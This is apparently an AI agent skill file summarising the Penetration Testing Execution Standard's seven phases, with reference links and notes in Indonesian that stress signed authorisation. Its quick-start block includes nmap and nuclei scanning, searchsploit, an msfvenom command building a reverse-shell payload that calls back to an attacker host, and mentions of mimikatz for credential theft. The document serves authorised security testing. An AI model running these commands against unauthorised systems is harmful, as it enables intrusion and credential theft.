---
name: ptes-standard
description: Penetration Testing Execution Standard (PTES) — comprehensive guide for conducting penetration tests across 7 phases: pre-engagement, intelligence gathering, threat modeling, vulnerability analysis, exploitation, post-exploitation, and reporting. Use when planning or executing penetration tests, security assessments, or when user asks about PTES methodology.
license: MIT
compatibility: opencode
metadata:
  source: PTES
  version: "2.0"
---

# PTES — Penetration Testing Execution Standard

## Prerequisites

- Understanding of penetration testing concepts and phases
- Familiarity with common security tools (Nmap, Metasploit, Burp Suite)
- Basic networking and web application knowledge
- Awareness of legal and compliance requirements

## Quick Start Workflow

```bash
# 1. Pre-engagement: Define scope, get authorization
# ROE document: targets, techniques, timeline, emergency contacts

# 2. Intelligence Gathering: OSINT + active recon
amass enum -passive -d target.com -o recon.txt
nmap -sS -sV -O -p- $TARGET

# 3. Threat Modeling: Identify assets, threats, attack vectors
# Use STRIDE for system flaws, PASTA for enterprise risk

# 4. Vulnerability Analysis: Scan + verify + prioritize
nuclei -u $TARGET -t ~/nuclei-templates/
# Manual verification of all findings

# 5. Exploitation: Gain access, demonstrate impact
searchsploit $version
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f elf -o payload.elf

# 6. Post-Exploitation: Enumerate, pivot, persist
# Linux: sudo -l, find SUID, cron, creds
# Windows: whoami /all, mimikatz, BloodHound

# 7. Reporting: Executive summary + technical findings
```

## The 7 Phases of PTES

| Phase | Focus | Reference |
|-------|-------|-----------|
| 1. Pre-engagement | Scoping, ROE, legal agreements | [pre-engagement.md](./references/pre-engagement.md) |
| 2. Intelligence Gathering | OSINT, passive/active recon | [intelligence-gathering.md](./references/intelligence-gathering.md) |
| 3. Threat Modeling | Identify assets, threats, attack vectors | [threat-modeling.md](./references/threat-modeling.md) |
| 4. Vulnerability Analysis | Automated + manual discovery | [vulnerability-analysis.md](./references/vulnerability-analysis.md) |
| 5. Exploitation | Gaining access, bypassing controls | [exploitation.md](./references/exploitation.md) |
| 6. Post-Exploitation | Persistence, pivoting, data exfiltration | [post-exploitation.md](./references/post-exploitation.md) |
| 7. Reporting | Findings, risk ratings, remediation | [reporting.md](./references/reporting.md) |

## Reference Documentation

| File | Description |
|------|-------------|
| [pre-engagement.md](./references/pre-engagement.md) | Scoping, ROE, authorization, deliverables |
| [intelligence-gathering.md](./references/intelligence-gathering.md) | OSINT techniques, active recon, OSINT levels |
| [threat-modeling.md](./references/threat-modeling.md) | STRIDE, PASTA, attack trees, framework comparison |
| [vulnerability-analysis.md](./references/vulnerability-analysis.md) | Scanning, validation, depth vs breadth |
| [exploitation.md](./references/exploitation.md) | Precision strike approach, WAF evasion |
| [post-exploitation.md](./references/post-exploitation.md) | Enumeration, lateral movement, persistence |
| [reporting.md](./references/reporting.md) | Report structure, CVSS, executive summary |
| [phase-deep-dives.md](./references/phase-deep-dives.md) | Scoping questionnaire, OSINT levels, tools matrix, standards comparison |
| [modern-infra.md](./references/modern-infra.md) | Cloud, K8s, API/microservices adaptations |
| [legal-compliance.md](./references/legal-compliance.md) | PCI DSS, HIPAA, GDPR, FedRAMP, CSP policies |
| [referensi.md](./references/referensi.md) | 125+ external PTES resources |

## Gotchas

1. **PTES ≠ checklist**: PTES adalah process framework, bukan technical checklist. Jangan treat sebagai to-do list — adaptasi berdasarkan konteks engagement.
2. **Standards comparison bukan kompetisi**: Tidak ada standar yang "terbaik". PTES untuk engagement lifecycle, OWASP WSTG untuk technical web depth, NIST untuk compliance. Gunakan kombinasi, bukan pilih satu.
3. **Legal authorization adalah fase terpenting**: Jangan pernah melakukan pengujian tanpa ROE yang ditandatangani. Satu langkah tanpa otorisasi bisa berakibat pidana (CFAA, UU ITE).
4. **Cloud mengubah perimeter**: Di cloud, identity adalah perimeter baru. IAM trust relationships lebih penting dari network segmentation. PTES tradisional perlu diadaptasi untuk cloud-native environments.
5. **Post-exploitation sering dilupakan**: Banyak tester fokus pada exploitation dan lupa post-exploitation. Padahal nilai engagement ada di seberapa dalam tester bisa menembus dan dampak bisnis yang bisa didemonstrasikan.
6. **Reporting adalah produk akhir**: Client membayar untuk report, bukan untuk exploitation. Report yang buruk membuat engagement bernilai nol. Alokasikan waktu yang cukup untuk reporting.

## Progressive Disclosure

| When you need... | Load this file |
|------------------|----------------|
| Scoping, authorization, legal | [pre-engagement.md](./references/pre-engagement.md) |
| OSINT and reconnaissance techniques | [intelligence-gathering.md](./references/intelligence-gathering.md) |
| Threat modeling methodologies | [threat-modeling.md](./references/threat-modeling.md) |
| Vulnerability scanning and validation | [vulnerability-analysis.md](./references/vulnerability-analysis.md) |
| Exploitation and WAF evasion | [exploitation.md](./references/exploitation.md) |
| Post-exploitation and pivoting | [post-exploitation.md](./references/post-exploitation.md) |
| Report writing and risk scoring | [reporting.md](./references/reporting.md) |
| Tools matrix and standards comparison | [phase-deep-dives.md](./references/phase-deep-dives.md) |
| Cloud, K8s, and API adaptations | [modern-infra.md](./references/modern-infra.md) |
| Compliance requirements | [legal-compliance.md](./references/legal-compliance.md) |
| External PTES resources | [referensi.md](./references/referensi.md) |

## License

MIT
